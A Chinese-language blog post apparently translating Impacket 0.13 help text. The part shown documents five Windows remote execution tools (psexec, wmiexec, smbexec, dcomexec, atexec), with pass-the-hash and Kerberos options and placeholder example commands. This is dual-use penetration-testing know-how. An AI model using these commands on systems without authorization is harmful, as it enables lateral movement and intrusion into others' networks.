@@ -1,0 +1,6191 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wenfenhui">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wenfenhui">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,博客,技术,编程">
+    <meta name="description" content="个人技术博客，记录学习与成长">
+    <meta name="description" content="Impacket wiki中文指南由于impacket的工具他是没有所谓的wiki介绍的，导致很多时候要用一些py脚本的时候需要不停的查看帮助使用。我这里这里针对impacket0.13稳定版的68个脚本的使用做了翻译和分类。使用的时候我们可以直接把该md喂给ai让ai去给出相关py脚本的命令效率更快。 远程执行工具psexec.py功能: Windows 远程命令执行工具，基于 Sysinter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Impacket wiki中文指南">
+<meta property="og:url" content="https://wenfenhui.github.io/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/index.html">
+<meta property="og:site_name" content="Wenfenhui&#39;s Blog">
+<meta property="og:description" content="Impacket wiki中文指南由于impacket的工具他是没有所谓的wiki介绍的，导致很多时候要用一些py脚本的时候需要不停的查看帮助使用。我这里这里针对impacket0.13稳定版的68个脚本的使用做了翻译和分类。使用的时候我们可以直接把该md喂给ai让ai去给出相关py脚本的命令效率更快。 远程执行工具psexec.py功能: Windows 远程命令执行工具，基于 Sysinter">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-08T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-08T16:02:14.248Z">
+<meta property="article:author" content="wenfenhui">
+<meta property="article:tag" content="工具wiki">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Impacket wiki中文指南 · Wenfenhui&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Wenfenhui's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Wenfenhui&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Impacket wiki中文指南</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Impacket wiki中文指南
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="工具wiki">工具wiki</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2026/04/08</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Impacket-wiki中文指南"><a href="#Impacket-wiki中文指南" class="headerlink" title="Impacket wiki中文指南"></a>Impacket wiki中文指南</h1><p>由于impacket的工具他是没有所谓的wiki介绍的，导致很多时候要用一些py脚本的时候需要不停的查看帮助使用。我这里这里针对impacket0.13稳定版的68个脚本的使用做了翻译和分类。使用的时候我们可以直接把该md喂给ai让ai去给出相关py脚本的命令效率更快。</p>
+<h2 id="远程执行工具"><a href="#远程执行工具" class="headerlink" title="远程执行工具"></a>远程执行工具</h2><h3 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h3><p><strong>功能</strong>: Windows 远程命令执行工具，基于 Sysinternals PsExec<br><strong>用途</strong>: 通过 SMB 协议在远程 Windows 系统上执行命令</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>command</code></td>
+<td>要在目标系统执行的命令（默认: cmd.exe）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-c pathname</code></td>
+<td>复制文件以便后续执行，参数通过 command 选项传递</td>
+</tr>
+<tr>
+<td><code>-path PATH</code></td>
+<td>要执行的命令路径</td>
+</tr>
+<tr>
+<td><code>-file FILE</code></td>
+<td>替代 RemCom 二进制文件（确保不需要 CRT）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-codec CODEC</code></td>
+<td>设置目标输出使用的编码（默认 “gbk”）</td>
+</tr>
+<tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+<tr>
+<td><code>-service-name service_name</code></td>
+<td>用于触发有效负载的服务名称</td>
+</tr>
+<tr>
+<td><code>-remote-binary-name remote_binary_name</code></td>
+<td>上传到目标的可执行文件名称</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py domain/username:password@target_ip</span><br><span class="line">python psexec.py -c <span class="string">&quot;program.exe&quot;</span> domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p><strong>功能</strong>: 通过 WMI (Windows Management Instrumentation) 进行远程命令执行<br><strong>用途</strong>: 使用 WMI 接口在远程系统上执行命令，无需上传执行文件</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>command</code></td>
+<td>要在目标系统执行的命令，如果为空则启动半交互式 shell</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-share SHARE</code></td>
+<td>从中获取输出的共享（默认 ADMIN$）</td>
+</tr>
+<tr>
+<td><code>-nooutput</code></td>
+<td>是否不打印输出（不创建 SMB 连接）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-silentcommand</code></td>
+<td>不执行 cmd.exe 来运行给定命令（无输出）</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-codec CODEC</code></td>
+<td>设置目标输出使用的编码（默认 “gbk”）</td>
+</tr>
+<tr>
+<td><code>-shell-type {cmd,powershell}</code></td>
+<td>为半交互式 shell 选择命令处理器</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-A authfile</code></td>
+<td>smbclient&#x2F;mount.cifs 样式的身份验证文件</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py domain/username:password@target_ip</span><br><span class="line">python wmiexec.py -shell-<span class="built_in">type</span> powershell domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a>smbexec.py</h3><p><strong>功能</strong>: 通过 SMB 进行远程命令执行<br><strong>用途</strong>: 使用 SMB 协议在远程系统上执行命令</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-share SHARE</code></td>
+<td>从中获取输出的共享（默认 C$）</td>
+</tr>
+<tr>
+<td><code>-mode {SERVER,SHARE}</code></td>
+<td>使用的模式（默认 SHARE，SERVER 需要 root！）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-codec CODEC</code></td>
+<td>设置目标输出使用的编码（默认 “gbk”）</td>
+</tr>
+<tr>
+<td><code>-shell-type {cmd,powershell}</code></td>
+<td>shell 类型</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+<tr>
+<td><code>-service-name service_name</code></td>
+<td>用于触发有效负载的服务名称</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py domain/username:password@target_ip</span><br><span class="line">python smbexec.py -shell-<span class="built_in">type</span> powershell domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="dcomexec-py"><a href="#dcomexec-py" class="headerlink" title="dcomexec.py"></a>dcomexec.py</h3><p><strong>功能</strong>: 通过 DCOM (Distributed Component Object Model) 进行远程命令执行<br><strong>用途</strong>: 使用 DCOM 接口在远程系统上执行命令</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>command</code></td>
+<td>要在目标系统执行的命令，如果为空则启动半交互式 shell</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-share SHARE</code></td>
+<td>从中获取输出的共享（默认 ADMIN$）</td>
+</tr>
+<tr>
+<td><code>-nooutput</code></td>
+<td>是否不打印输出（不创建 SMB 连接）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-codec CODEC</code></td>
+<td>设置目标输出使用的编码（默认 “gbk”）</td>
+</tr>
+<tr>
+<td><code>-object [{ShellWindows,ShellBrowserWindow,MMC20}]</code></td>
+<td>用于执行 shell 命令的 DCOM 对象（默认&#x3D;ShellWindows）</td>
+</tr>
+<tr>
+<td><code>-com-version MAJOR_VERSION:MINOR_VERSION</code></td>
+<td>DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION</td>
+</tr>
+<tr>
+<td><code>-shell-type {cmd,powershell}</code></td>
+<td>为半交互式 shell 选择命令处理器</td>
+</tr>
+<tr>
+<td><code>-silentcommand</code></td>
+<td>不执行 cmd.exe 来运行给定命令（无输出，不能运行 dir&#x2F;cd 等）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-A authfile</code></td>
+<td>smbclient&#x2F;mount.cifs 样式的身份验证文件</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python dcomexec.py domain/username:password@target_ip</span><br><span class="line">python dcomexec.py -<span class="built_in">object</span> ShellBrowserWindow domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="atexec-py"><a href="#atexec-py" class="headerlink" title="atexec.py"></a>atexec.py</h3><p><strong>功能</strong>: 通过服务执行远程命令<br><strong>用途</strong>: 创建临时服务来执行命令</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>command</code></td>
+<td>要在目标系统执行的命令</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-session-id SESSION_ID</code></td>
+<td>要使用的现有登录会话（无输出，无 cmd.exe）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-silentcommand</code></td>
+<td>不执行 cmd.exe 来运行给定命令（无输出）</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-codec CODEC</code></td>
+<td>设置目标输出使用的编码（默认 “gbk”）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py domain/username:password@target_ip <span class="string">&quot;ipconfig&quot;</span></span><br><span class="line">python atexec.py -silentcommand domain/username:password@target_ip <span class="string">&quot;net user&quot;</span></span><br></pre></td></tr></table></figure>
+
